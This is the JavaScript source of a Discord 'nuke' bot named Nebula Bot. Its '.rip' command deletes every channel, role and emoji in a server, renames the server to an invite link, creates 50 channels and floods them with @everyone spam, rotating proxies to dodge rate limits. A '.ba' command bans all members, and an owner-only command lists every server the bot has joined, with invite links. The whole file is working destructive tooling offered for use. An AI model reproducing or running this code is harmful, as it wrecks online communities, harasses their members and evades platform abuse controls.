const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fs = require('fs');
dotenv.config();

// ====== PROXY SETUP (Supports https-proxy-agent v5 & v6 + SOCKS5) ======
let HttpProxyAgent;
try {
  const agentModule = require('https-proxy-agent');
  HttpProxyAgent = typeof agentModule === 'function'
    ? agentModule
    : agentModule.HttpProxyAgent || agentModule.default;
} catch (err) {
  console.warn('⚠️ Could not load https-proxy-agent:', err.message);
}

const { SocksProxyAgent } = require('socks-proxy-agent');

let proxies = [];
let currentProxyIndex = 0;

function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf-8');
    proxies = data
      .split(/\r?\n|\r/)
      .map(line => line.trim())
      .filter(line => line && !line.startsWith('#') && line.length > 5);
    console.log(`✅ Loaded ${proxies.length} proxies.`);
  } catch (err) {
    console.warn('⚠️ Could not read proxies.txt:', err.message);
    proxies = [];
  }
}

function getProxyAgent() {
  if (proxies.length === 0) return null;

  const proxy = proxies[currentProxyIndex];
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;

  if (proxy.startsWith('socks5://')) {
    return new SocksProxyAgent(proxy);
  } else {
    return HttpProxyAgent ? new HttpProxyAgent(proxy) : null;
  }
}

// Reload proxies every 5 minutes
setInterval(loadProxies, 5 * 60 * 1000);
loadProxies(); // Load on startup

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== APPLY PROXY TO DISCORD.JS REST API (Optional fallback) ======
const rest = client.rest;
const originalRequest = rest.request.bind(rest);

rest.request = async function(options) {
  const agent = getProxyAgent();
  if (agent) {
    options.agent = { https: agent };
  }
  return await originalRequest(options);
};

// ====== WEB SERVER (Keeps Uptime on Render/Railway) ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on port ${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = (error.retry_after || 1000) * 1.2;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  console.error('[FAIL] Max retries reached.');
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  try {
    if (!guild || !guild.available || !guild.members.me) {
      console.log('ℹ️ Already left or guild unavailable');
      return;
    }
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Left server successfully.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked.');
    } else {
      console.error('⚠️ Error leaving:', err.message);
    }
  }
}

// ====== SEND MESSAGE WITH PROXY (Per-Channel Spam) ======
async function sendMessageWithProxy(channel, content, agent) {
  const rest = client.rest;

  const options = {
    method: 'POST',
    path: `/channels/${channel.id}/messages`,
    data: { content },
    versioned: true,
  };

  if (agent) {
    options.agent = { https: agent };
  }

  try {
    await rest.request(options);
    return true;
  } catch (error) {
    if (error.code === 429) {
      const retryAfter = (error.retry_after || 1500) * 1.5;
      console.warn(`[RATELIMIT] Holding proxy for ${retryAfter}ms`);
      await new Promise(resolve => setTimeout(resolve, retryAfter));
    } else {
      console.warn('❌ Proxy request failed:', error.message || error);
    }
    return false;
  }
}

// ====== BOT EVENTS ======
client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('.rip', { type: 'PLAYING' });
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Available commands:')
      .addFields(
        { name: '.rip', value: 'Nukes server: deletes roles, emojis, channels, then spams 50 channels using 1 proxy each' },
        { name: '.ba', value: 'Bans all members (except owner)' },
        { name: '.help', value: 'Sends this help to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly!' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.reply('📬 Help sent to your DMs!');
    } catch (err) {
      await message.reply('❌ I can\'t DM you. Enable DMs from server members.');
    }
    return;
  }

  // ===== SERVERS COMMAND (OWNER ONLY) =====
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') {
      return message.reply('❌ Not authorized.');
    }

    const guilds = client.guilds.cache;
    const list = [];

    for (const [, guild] of guilds) {
      try {
        const owner = await handleRateLimit(() => guild.fetchOwner());
        const invites = await handleRateLimit(() => guild.invites.fetch());
        const invite = invites.first()?.url || 'No active invite';
        list.push({ name: guild.name, owner: owner.user.tag, id: guild.id, invite });
      } catch (err) {
        list.push({ name: guild.name, error: 'No access', id: guild.id });
      }
    }

    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers I\'m In')
      .setDescription(`Total: ${list.length}`)
      .setColor('#00ffff');

    list.slice(0, 25).forEach((g, i) => {
      embed.addFields({
        name: `${i + 1}. ${g.name}`,
        value: g.error ? `ID: ${g.id}\n⚠️ ${g.error}` : `Owner: ${g.owner}\nID: ${g.id}\n[Join](${g.invite})`
      });
    });

    try {
      await message.author.send({ embeds: [embed] });
      await message.reply('✅ Server list sent to DMs!');
    } catch (err) {
      await message.reply('❌ Could not send DM.');
    }
    return;
  }

  // Block .ba and .rip in protected server
  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 Command disabled here.');
  }

  // ===== BAN ALL MEMBERS =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BanMembers')) {
      return message.reply("❌ You can't ban members.");
    }

    const guild = message.guild;
    const ownerID = guild.ownerId;
    const members = await guild.members.fetch();
    const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);

    if (toBan.size === 0) return message.reply('❌ No members to ban.');

    await message.reply(`🔪 Banning ${toBan.size} members...`);

    let banned = 0;
    for (const member of toBan.values()) {
      await handleRateLimit(() => guild.members.ban(member, { reason: 'Nebula BA' }));
      banned++;
      if (banned % 10 === 0) await new Promise(r => setTimeout(r, 500));
    }

    await message.reply(`✅ Banned ${banned} members.`);
    return;
  }

  // ===== RIP COMMAND: 50 Channels, 1 Proxy Each, 20 Messages =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
    const chName = 'neb-was-here';

    if (!message.member.permissions.has('ManageChannels') || !message.member.permissions.has('ManageRoles')) {
      return message.reply("❌ You need 'Manage Channels' and 'Manage Roles' permissions.");
    }

    try {
      // === 1. Delete existing channels, roles, emojis ===
      await Promise.all(guild.channels.cache.map(ch => handleRateLimit(() => ch.delete())));
      await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete())));
      await Promise.all(guild.emojis.cache.map(e => handleRateLimit(() => e.delete())));
      await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }));

      // === 2. Create 50 channels ===
      const channelPromises = [];
      for (let i = 0; i < 50; i++) {
        channelPromises.push(
          handleRateLimit(() => guild.channels.create({ name: `${chName}-${i + 1}` }))
            .catch(err => {
              console.warn(`Failed to create channel ${i + 1}:`, err.message);
              return null;
            })
        );
      }

      const channels = (await Promise.all(channelPromises)).filter(ch => ch !== null);
      if (channels.length === 0) {
        await message.channel.send('❌ Failed to create any channels.');
        return;
      }

      await message.channel.send(`✅ Created ${channels.length} channels. Starting proxy spam...`);

      // === 3. Assign 1 proxy per channel and spam 20 times ===
      let totalSent = 0;

      const spamJobs = channels.map(async (channel) => {
        let sent = 0;
        const proxyAgent = getProxyAgent(); // One proxy per channel

        if (!proxyAgent) {
          console.warn(`No proxy for ${channel.name}, skipping.`);
          return 0;
        }

        for (let i = 0; i < 20; i++) {
          const success = await sendMessageWithProxy(channel, spamMsg, proxyAgent);
          if (success) sent++;
          else break; // Stop spamming if proxy fails
        }

        totalSent += sent;
        return sent;
      });

      // Run all spam jobs in parallel
      const results = await Promise.allSettled(spamJobs);
      const finalSent = results.reduce((sum, r) => (r.status === 'fulfilled' ? sum + r.value : sum), 0);

      console.log(`✅ Spammed ${finalSent} messages across ${channels.length} channels.`);
      await safeLeaveGuild(guild);
      await message.channel.send(`✅ Nuke complete! ${finalSent} messages sent.`);
    } catch (err) {
      await message.channel.send(`❌ Nuke failed: \`${err.message}\``);
      console.error(err);
    }
    return;
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
